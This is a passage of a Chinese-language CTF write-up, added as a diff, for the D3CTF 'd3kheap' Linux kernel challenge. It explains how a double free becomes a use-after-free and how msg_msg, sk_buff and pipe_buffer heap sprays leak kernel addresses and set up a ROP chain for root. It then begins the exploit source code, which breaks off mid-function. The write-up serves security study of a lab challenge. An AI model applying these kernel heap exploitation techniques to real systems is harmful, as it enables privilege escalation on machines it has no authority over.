@@ -1,0 +1,256 @@
+# 0x00.一切开始之前
+今年 D3CTF 的一道 kernel pwn 题，赛后笔者仔细研究了下，相比起出题人最初提供的使用 setxattr 多次篡改 `msg_msg`
+的方法而言，这道题其实还可以套用 CVE-2021-22555 的堆喷 `msg_msg` 与 `sk_buff` 的解法，成功率更高也更加稳定
+# 0x01.题目分析
+题目还是按惯例给了一个内核模块，其中只有 ioctl 功能是有用的，简单分析可以知道其中有用的仅为 `0x1234` 与 `0xdead`
+两个功能，对应着分配 buf 与释放 buf，在分配时会先判断 buf 是否为 NULL 因此我们不能重复分配，完成分配后 `ref_count`
+会加一，而在释放时 `ref_count` 会减一
+漏洞其实就出现在这里，其判断 buf 是否被释放依靠的是 `reff_count` 而并非 buf 指针，且在释放后未将 buf 置 NULL， **而
+ref_count 被错误地初始化为 1，这使得我们可以释放 buf 两次**
+# 0x02.漏洞利用
+因为在 slub_free 中有着对 double free 的简单检查（类似于 glibc 中的 fastbin，会检查 freelist 指向的第一个
+object），因此我们不能够直接进行 double free，而应该将其转化为 UAF 进行利用
+## Pre. 构造 UAF
+我们首先需要构造一个 UAF，我们不难想到如下利用链：
+  * 分配一个 1024 大小的 object
+  * 释放该 object
+  * 将其分配到别的结构体（victim）上
+  * 释放该 object
+此时 victim 虽然还处在使用阶段，但是 **在 slub 中其同时也被视为一个 free object** ，我们此时便完成了 UAF 的构造，由于
+slub 遵循 LIFO，因此接下来分配的第一个大小为 1024 的 object **便会是 victim**
+## Step.I 堆喷 `msg_msg` ，建立主从消息队列
+既然我们现在有了一个UAF的机会，那么选用什么样的结构体作为 victim 呢？这里我们选择使用 `msg_msg` 这一结构体：
+    /* one msg_msg structure for each message */
+    struct msg_msg {
+        struct list_head m_list;
+        long m_type;
+        size_t m_ts;        /* message text size */
+        struct msg_msgseg *next;
+        void *security;
+        /* the actual message follows immediately */
+    };
+当我们在一个消息队列上发送多个消息时，会形成如下结构：
+我们不难想到的是，我们可以在一开始时先通过 d3kheap 设备提供的功能 **先获取一个 object 后释放**
+，之后堆喷多个消息队列，并分别在每一个消息队列上发送两条消息，形成如下内存布局，这里为了便利后续利用，第一条消息（主消息）的大小为
+96，第二条消息（辅助消息）的大小为 0x400：
+此时 **我们的辅助消息便有极大的概率获取到之前释放的 object**
+> 利用 `MSG_COPY`
+> 标志位可以读取消息队列上的消息而不释放，参见[这里](https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-> KERNEL-PWN-PART-> IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D)
+## Step.II 构造 UAF，堆喷 `sk_buff` 定位 victim 队列
+此时我们直接利用题目的功能将辅助消息释放掉，便能成功完成 UAF 的构建，此时 **我们仍能通过其中一个消息队列访问到该辅助消息对应
+object，但实际上这个 object 已经在 freelist 上了**
+但此时我们无法得知是哪一个消息队列命中了 UAF object，这个时候我们选用 `sk_buff` 堆喷劫持该结构体
+类似于 `msg_msg`，其同样可以提供近乎任意大小对象的分配写入与释放，但不同的是 `msg_msg` 由一个 header 加上用户数据组成，而
+`sk_buff` 本身不包含任何用户数据， **用户数据单独存放在一个 object 当中，而 sk_buff 中存放指向用户数据的指针**
+至于这个结构体的分配与释放也是十分简单， **sk_buff 在内核网络协议栈中代表一个“包”，** 我们不难想到的是 **我们只需要创建一对
+socket，在上面发送与接收数据包就能完成 sk_buff 的分配与释放** ，最简单的办法便是用 socketpair 系统调用创建一对
+socket，之后对其 read & write 便能完成收发包的工作
+那么我们利用 `sk_buff` 堆喷向这个 UAF object 中写入什么数据呢？其实这里我们可以随便写入一些内容，之后我们使用 `MSG_COPY`
+flag 进行消息拷贝时便会失败，但不会 kernel panic， **因此我们可以通过判断是否读取消息失败来定位命中 UAF 的消息队列**
+## Step.III 堆喷 `sk_buff` 伪造辅助消息，泄露 UAF obj 地址
+接下来我们考虑如何继续利用这个 UAF，由于其位于消息队列上，所以我们可以利用消息队列的性质来完成利用
+首先我们考虑如何通过伪造 `msg_msg` 结构体完成信息泄露，我们不难想到的是可以伪造一个 `msg_msg` 结构体，将其 `m_ts`
+域设为一个较大值， **从而越界读取到相邻辅助消息的 header，泄露出堆上地址**
+我们泄露出来的是哪个地址？让我们重新将目光放回到消息队列的结构上：
+我们不难知道的是，该辅助消息的 prev 指针指向其主消息，而该辅助消息的 next 指针指向该消息队列的 `msg_queue`
+结构，这是目前我们已知的两个“堆上地址”
+接下来我们伪造 `msg_msg->next`， **将其指向我们的 UAF object
+相邻的辅助消息对应的主消息头部往前，从而读出该主消息的头部，泄露出对应的辅助消息的地址** ，有了这个辅助消息的地址，再减去 0x400 **便是我们的
+UAF 对象的地址**
+> 通过伪造 msg_msg->next
+> 可以完成任意地址读，参见[这里](https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-> PART-> IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D)
+## Step.IV 堆喷 `pipe_buffer`，泄露内核基址
+现在我们已知了可控区域的地址，接下来让我们来考虑泄露内核 .text 段的基址，以及如何劫持 RIP 完成提权
+之前我们为什么将辅助消息的大小设为 0x400？除了方便对齐以外，还有一层考虑就是这个大小刚好有一个十分实用的结构体 `pipe_buffer` 数组，
+**既能帮我们泄露内核代码段基址，也能帮我们劫持 RIP**
+当我们创建一个管道时，在内核中会生成数个连续的 `pipe_buffer` 结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个
+object
+    /**
+     *  struct pipe_buffer - a linux kernel pipe buffer
+     *  @page: the page containing the data for the pipe buffer
+     *  @offset: offset of data inside the @page
+     *  @len: length of data inside the @page
+     *  @ops: operations associated with this buffer. See @pipe_buf_operations.
+     *  @flags: pipe buffer flags. See above.
+     *  @private: private data owned by the ops.
+     **/
+    struct pipe_buffer {
+        struct page *page;
+        unsigned int offset, len;
+        const struct pipe_buf_operations *ops;
+        unsigned int flags;
+        unsigned long private;
+    };
+在 `pipe_buffer` 中存在一个函数表成员 `pipe_buf_operations` ，其指向内核中的函数表
+`anon_pipe_buf_ops`，若我们能够将其读出，便能泄露出内核基址，操作如下：
+  * 利用 `sk_buff` 修复辅助消息，之后从消息队列中接收该辅助消息，此时该 object 重回 slub 中，但 `sk_buff` 仍指向该 object
+  * 喷射 `pipe_buffer`，之后再接收 `sk_buff` 数据包， **我们便能读出 pipe_buffer 上数据，泄露内核基址**
+## Step.V 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权
+当我们关闭了管道的两端时，会触发 `pipe_buffer->pipe_buffer_operations->release` 这一指针，而 UAF
+object 的地址对我们而言是已知的，因此 **我们可以直接利用 sk_buff 在 UAF object 上伪造函数表与构造 ROP
+chain，再选一条足够合适的 gadget 完成栈迁移便能劫持 RIP 完成提权**
+## Final EXPLOIT
+最终的 exp 如下：
+    #define _GNU_SOURCE
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #include 
+    #define PRIMARY_MSG_SIZE 96
+    #define SECONDARY_MSG_SIZE 0x400
+    #define PRIMARY_MSG_TYPE    0x41
+    #define SECONDARY_MSG_TYPE  0x42
+    #define VICTIM_MSG_TYPE     0x1337
+    #define MSG_TAG     0xAAAAAAAA
+    #define SOCKET_NUM 16
+    #define SK_BUFF_NUM 128
+    #define PIPE_NUM 256
+    #define MSG_QUEUE_NUM 4096
+    #define OBJ_ADD     0x1234
+    #define OBJ_EDIT    0x4321
+    #define OBJ_SHOW    0xbeef
+    #define OBJ_DEL     0xdead
+    #define PREPARE_KERNEL_CRED 0xffffffff810d2ac0
+    #define INIT_CRED 0xffffffff82c6d580
+    #define COMMIT_CREDS 0xffffffff810d25c0
+    #define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0
+    #define POP_RDI_RET 0xffffffff810938f0
+    #define ANON_PIPE_BUF_OPS 0xffffffff8203fe40
+    #define FREE_PIPE_INFO 0xffffffff81327570
+    #define POP_R14_POP_RBP_RET 0xffffffff81003364
+    #define PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede
+    #define CALL_RSI_PTR 0xffffffff8105acec
+    size_t user_cs, user_ss, user_sp, user_rflags;
+    size_t kernel_offset, kernel_base = 0xffffffff81000000;
+    size_t prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode, init_cred;
+    long dev_fd;
+    int pipe_fd[2], pipe_fd2[2], pipe_fd_1;
+    /*
+     * skb_shared_info need to take 320 bytes at the tail
+     * so the max size of buf we should send is:
+     * 1024 - 320 = 704
+     */
+    char fake_secondary_msg[704];
+    void add(void)
+    {
+        ioctl(dev_fd, OBJ_ADD);
+    }
+    void del(void)
+    {
+        ioctl(dev_fd, OBJ_DEL);
+    }
+    size_t user_cs, user_ss, user_sp, user_rflags;
+    void saveStatus()
+    {
+        __asm__("mov user_cs, cs;"
+                "mov user_ss, ss;"
+                "mov user_sp, rsp;"
+                "pushf;"
+                "pop user_rflags;"
+                );
+        printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
+    }
+    struct list_head
+    {
+        uint64_t    next;
+        uint64_t    prev;
+    };
+    struct msg_msg
+    {
+        struct list_head m_list;
+        uint64_t    m_type;
+        uint64_t    m_ts;
+        uint64_t    next;
+        uint64_t    security;
+    };
+    struct msg_msgseg
+    {
+        uint64_t    next;
+    };
+    struct 
+    {
+        long mtype;
+        char mtext[PRIMARY_MSG_SIZE - sizeof(struct msg_msg)];
+    }primary_msg;
+    struct 
+    {
+        long mtype;
+        char mtext[SECONDARY_MSG_SIZE - sizeof(struct msg_msg)];
+    }secondary_msg;
+    struct
+    {
+        long mtype;
+        char mtext[0x1000 - sizeof(struct msg_msg) + 0x1000 - sizeof(struct msg_msgseg)];
+    } oob_msg;
+    struct pipe_buffer
+    {
+        uint64_t    page;
+        uint32_t    offset, len;
+        uint64_t    ops;
+        uint32_t    flags;
+        uint32_t    padding;
+        uint64_t    private;
+    };
+    struct pipe_buf_operations
+    {
+        uint64_t    confirm;
+        uint64_t    release;
+        uint64_t    try_steal;
+        uint64_t    get;
+    };
+    void errExit(char *msg)
+    {
+        printf("\033[31m\033[1m[x] Error: %s\033[0m\n", msg);
+        exit(EXIT_FAILURE);
+    }
+    int readMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
+    {
+        return msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0);
+    }
+    int writeMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
+    {
+        *(long*)msgp = msgtyp;
+        return msgsnd(msqid, msgp, msgsz - sizeof(long), 0);
+    }
+    int peekMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
+    {
+        return msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, MSG_COPY | IPC_NOWAIT);
+    }
+    void buildMsg(struct msg_msg *msg, uint64_t m_list_next,
+        uint64_t m_list_prev, uint64_t m_type, uint64_t m_ts, 
+        uint64_t next, uint64_t security)
+    {
+        msg->m_list.next = m_list_next;
+        msg->m_list.prev = m_list_prev;
+        msg->m_type = m_type;
+        msg->m_ts = m_ts;
+        msg->next = next;
+        msg->security = security;
+    }
+    int spraySkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
+    {
+        for (int i = 0; i < SOCKET_NUM; i++)
+            for (int j = 0; j < SK_BUFF_NUM; j++)
+            {
+                // printf("[-] now %d, num %d\n", i, j);
+                if (write(sk_socket[i][0], buf, size) < 0)
+                    return -1;
+            }
+        return 0;
+    }
+    int freeSkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
+    {
+        for (int i = 0; i < SOCKET_NUM; i++)
+            for (int j = 0; j < SK_BUFF_NUM; j++)
+                if (read(sk_socket[i][1], buf, size) < 0)
+                    return -1;
+        return 0;
